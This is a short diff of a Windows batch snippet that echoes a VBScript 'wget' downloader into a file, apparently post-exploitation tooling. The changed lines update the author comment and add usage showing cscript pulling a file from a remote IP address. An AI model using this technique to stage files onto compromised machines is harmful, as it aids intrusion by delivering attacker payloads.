@@ -1,7 +1,8 @@
 echo rem Creates a Wget VBS Script > wget.vbs
 echo rem By: xG//05t >> wget.vbs
-echo rem Purpose: Fun & Research >> wget.vbs
-echo rem Creates a Wget VBS Script >> wget.vbs
+echo rem Purpose: Fun/Research >> wget.vbs
+echo rem Usage: >> wget.vbs
+echo rem .\cscript wget.vbs http://IPAddress/RemoteFileName LocalFileName >> wget.vbs
 echo strUrl = WScript.Arguments.Item(0) >> wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
 echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
